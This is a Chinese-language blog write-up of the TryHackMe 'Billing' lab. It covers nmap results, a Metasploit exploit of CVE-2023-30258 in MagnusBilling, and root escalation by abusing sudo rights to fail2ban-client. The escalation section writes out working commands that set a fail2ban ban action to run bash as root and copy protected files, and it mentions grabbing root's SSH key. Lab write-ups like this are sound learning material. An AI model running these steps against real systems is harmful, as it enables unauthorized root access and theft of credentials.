---
layout: post
title:  "Writeup | Billing"
date:   2 July 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
本篇是關於TryHackMe上的Challenge: [Billing](https://tryhackme.com/room/billing) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度



### Step 1. Nmap

```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 91:a5:e6:d7:35:fa:55:86:59:08:2b:37:0a:18:cf:a7 (ECDSA)
|_  256 d4:91:a3:93:ea:71:c6:84:b3:f5:dc:ec:50:1a:a5:c3 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.164.169/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



### Step 2. Web(80)
- 發現一個login界面，並且通過nmap結果得知有在運行mysql
- 可以嘗試看看SQLi，但首先可以先利用忘記密碼的功能來獲得已存在的郵件地址
- 但爆破了一下發現還不知道mail host不清確定是什麼，還是返回先去測試看看 SQLi
- OK, 用 sqlmap 爆破了一下發現有Firewall/IPS，然後IP被封鎖了 :D
- 發現port 5038並且是 Asterisk Call Manager，並使用Asterisk AMI

```bash
└─# nc 10.10.164.169 5038
Asterisk Call Manager/2.10.6
Action: Login
Username: admin
Secret: amp111

Response: Error
Message: Authentication failed
```

- 試了幾次之後也發現IP被封鎖了 :D
- 代表絕對不是通過error-based方法
- 查了一下 Asterisk Call Manager 和 MagnusBilling 發現後者有[CVE-2023-30258](https://www.cve.org/CVERecord?id=CVE-2023-30258)，並且用metasploit查有可以直接使用的module
- `linux/http/magnusbilling_unauth_rce_cve_2023_30258` 成功 exploit 獲得 user flag (asterisk)




### Step 3. 提權
- sudo -l 發現了可以利用的 `NOPASSWD: /usr/bin/fail2ban-client` 和 `Defaults!/usr/bin/fail2ban-client !requiretty`。
- 後者表示不需要TTY(交互式shell)，表示我們用metasploit獲得的shell就能exploit(實際上也沒辦法獲得.ssh)

```bash
Matching Defaults entries for asterisk on ip-10-10-114-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-114-12:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

- 接著上Google查 fail2ban-client privilege escalation: [fail2ban](https://github.com/rvizx/fail2ban) 和 [Fail2Ban 0.11.2 Privilege Escalation / Command Execution](https://packetstorm.news/files/id/189989/)
- 前者的script行不通,改用後者手動操作

```bash
sudo /usr/bin/fail2ban-client restart
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'" 
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

- 成功獲得root.txt，若是要獲得root shell的話把root.txt改為/root/.ssh/.id_rsa即可




### 總結
總的來說billing算是很簡單的靶機，user權限通過metasploit，而root權限通過sudo -l獲得特殊權限。

另外，fail2ban 需要理解一下，簡單來說就是可以看作一個簡易IPS，可以封鎖惡意的IP，或觸發自定義的行為，而正是因為可以執行自定義行為所以我們將觸發要執行的命令改為獲得root權限或複製root權限下的文件，再通過手動觸發封鎖的行為來進一步提權


## 學習資料
1. [TryHackMe Challenge: Billing](https://tryhackme.com/room/billing)
2. [Fail2Ban 0.11.2 Privilege Escalation / Command Execution](https://packetstorm.news/files/id/189989/)
3. [Github \| fail2ban](https://github.com/rvizx/fail2ban)

</div>
</body>
</html>
